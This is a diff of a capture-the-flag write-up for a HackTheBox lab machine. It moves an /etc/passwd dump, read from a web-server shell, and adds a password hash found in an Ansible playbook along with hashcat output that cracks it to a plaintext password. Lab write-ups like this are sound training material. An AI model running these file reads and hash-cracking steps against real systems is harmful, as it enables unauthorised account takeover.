@@ -860,6 +860,45 @@ www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
 
 Hmm...busy machine...Looked like I had company.
 
+```bash
+www-data@crossfit:/run$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+isaac:x:1000:1000:,,,:/home/isaac:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
+ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+vsftpd:x:1002:1002::/var/vsftpd:/bin/false
+Debian-exim:x:109:117::/var/spool/exim4:/usr/sbin/nologin
+ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
+hank:x:1004:1006::/home/hank:/bin/bash
+```
+
+root, isaac, and hank can login
+
 ```text
 www-data@crossfit:/home$ ls -la
 total 16
@@ -912,48 +951,91 @@ drwxrwxrwx 4 isaac admins  4096 May  9  2020 send_updates
 
 hank had user.txt, now just needed to move laterally to that user to get it
 
-found `adduser-hank.yml` in `/etc/ansible/playbooks` directory with hash -&gt; `hank:powerpuffgirls`
 
 
 
-```bash
-www-data@crossfit:/run$ cat /etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
-avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-isaac:x:1000:1000:,,,:/home/isaac:/bin/bash
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-mysql:x:107:114:MySQL Server,,,:/nonexistent:/bin/false
-ftp:x:108:116:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
-vsftpd:x:1002:1002::/var/vsftpd:/bin/false
-Debian-exim:x:109:117::/var/spool/exim4:/usr/sbin/nologin
-ftpadm:x:1003:1004::/srv/ftp:/usr/sbin/nologin
-hank:x:1004:1006::/home/hank:/bin/bash
+
+```text
+www-data@crossfit:/etc/ansible/playbooks$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Sep 21 06:20 .
+drwxr-xr-x 3 root root 4096 May  8  2020 ..
+-rw-r--r-- 1 root root  425 Sep  2  2020 adduser_hank.yml
+www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml 
+---
+
+- name: Add new user to all systems
+  connection: network_cli
+  gather_facts: false
+  hosts: all
+  tasks:
+    - name: Add the user 'hank' with default password and make it a member of the 'admins' group
+      user:
+        name: hank
+        shell: /bin/bash
+        password: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
+        groups: admins
+        append: yes
 ```
 
-root, isaac, and hank can login
+found `adduser-hank.yml` in `/etc/ansible/playbooks` directory with hash 
+
+```text
+┌──(zweilos㉿kali)-[~/htb/crossfit]
+└─$ hashcat --help | grep -i '$6'                                           
+   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System
+                                                                                                        
+                                                                                                   
+┌──(zweilos㉿kali)-[~/htb/crossfit]
+└─$ hashcat -O -D1,2 -a0 -m1800 hash /usr/share/wordlists/rockyou.txt       
+hashcat (v6.1.1) starting...
+
+Hashfile 'hash' on line 1 ($2y$10...e4oKoEa3Ro9llC/.og/at2.uheWG/igi): Token length exception
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 65 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/:powerpuffgirls
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: sha512crypt $6$, SHA512 (Unix)
+Hash.Target......: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCf...C1CZG/
+Time.Started.....: Sun Mar 21 23:09:52 2021 (9 secs)
+Time.Estimated...: Sun Mar 21 23:10:01 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     2873 H/s (8.31ms) @ Accel:64 Loops:512 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 23818/14344385 (0.17%)
+Rejected.........: 10/23818 (0.04%)
+Restore.Point....: 23562/14344385 (0.16%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
+Candidates.#1....: skorpion -> 211291
+
+Started: Sun Mar 21 23:09:29 2021
+Stopped: Sun Mar 21 23:10:02 2021
+```
+
+-&gt; `hank:powerpuffgirls`
 
 ### User.txt
 
